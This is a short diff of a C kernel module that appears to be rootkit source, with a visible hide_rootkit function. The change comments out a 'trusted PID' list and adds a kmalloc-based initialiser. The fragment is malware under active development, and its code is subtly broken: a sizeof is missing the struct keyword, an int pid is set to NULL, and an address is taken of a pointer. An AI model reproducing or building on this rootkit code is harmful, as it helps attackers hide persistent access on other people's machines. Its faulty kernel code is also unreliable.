@@ -6,13 +6,18 @@
 
 extern int BUFFER_SIZE;
 
-struct trusted_pid_node_t{
+/*struct trusted_pid_node_t{
 	int pid;
 	struct trusted_pid_node_t *next;
 };
-struct trusted_pid_node_t trusted_pid_head = {.pid=NULL, .next=NULL};
+struct trusted_pid_node_t *trusted_pid_head;
 
-
+static int init_trusted_pid_head(void){
+	trusted_pid_head = (struct trusted_pid_node_t *) kmalloc(sizeof(trusted_pid_node_t), GFP_KERNEL);
+	trusted_pid_head->pid = NULL;
+	trusted_pid_head->next = NULL;
+	return 0;
+}
 
 static int trust_pid(int pid){
 	struct trusted_pid_node_t *current = &trusted_pid_head;
@@ -69,7 +74,7 @@ static int list_trusted_pids(void){
 	log_msg(buffer);
 	return 0;
 }
-
+*/
 
 
 static int hide_rootkit(bool hide){
